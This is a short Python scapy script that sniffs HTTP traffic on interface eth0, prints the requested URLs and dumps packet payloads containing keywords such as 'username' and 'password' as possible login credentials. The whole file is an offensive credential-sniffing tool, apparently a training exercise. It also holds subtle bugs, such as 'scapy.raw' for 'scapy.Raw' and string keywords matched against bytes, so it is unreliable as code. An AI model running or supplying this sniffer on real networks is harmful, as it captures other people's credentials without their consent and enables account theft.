import scapy.all as scapy 
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_website_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.raw):
        load = packet[scapy.Raw].load
        key_words = ["username", "user", "login", "password", "pass"]
        for item in key_words:
            if item in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet.show())
        url = get_website_url(packet)
        print(f"[+] HTTP Request >> {url.decode()}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password >> {login_info.decode()}\n\n")


sniff("eth0")
